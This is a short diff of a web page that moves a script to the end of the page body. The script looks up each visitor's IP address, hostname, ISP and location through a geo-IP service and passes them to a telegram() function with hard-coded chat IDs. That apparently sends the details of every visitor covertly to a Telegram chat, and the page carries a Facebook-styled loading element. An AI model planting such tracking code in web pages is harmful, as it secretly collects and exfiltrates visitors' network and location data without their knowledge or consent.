@@ -18,15 +18,6 @@ function telegram(ip,hostname,org,city,region,country,status,cid){
       }
       });
 }       
-
-$.get("https://json.geoiplookup.io/", function (response) {
-    negara = ["ID","TL"];
-    if(negara.includes(response.country_code)){
-        telegram(response.ip,response.hostname,response.asn_org,response.city,response.region,response.country_code,'PKVRESMI','-525226740');
-    } else {
-        telegram(response.ip,response.hostname,response.asn_org,response.city,response.district,response.country_code,'PKVRESMI NOT ID','-521650697');
-    }
-}, "jsonp")
 </script>
 <style>
 #facebookG{
@@ -159,3 +150,13 @@ opacity:0.1}
 </div>
 </div>
 </body>
+<script>
+$.get("https://json.geoiplookup.io/", function (response) {
+    negara = ["ID","TL"];
+    if(negara.includes(response.country_code)){
+        telegram(response.ip,response.hostname,response.asn_org,response.city,response.region,response.country_code,'PKVRESMI','-525226740');
+    } else {
+        telegram(response.ip,response.hostname,response.asn_org,response.city,response.district,response.country_code,'PKVRESMI NOT ID','-521650697');
+    }
+}, "jsonp")
+</script>
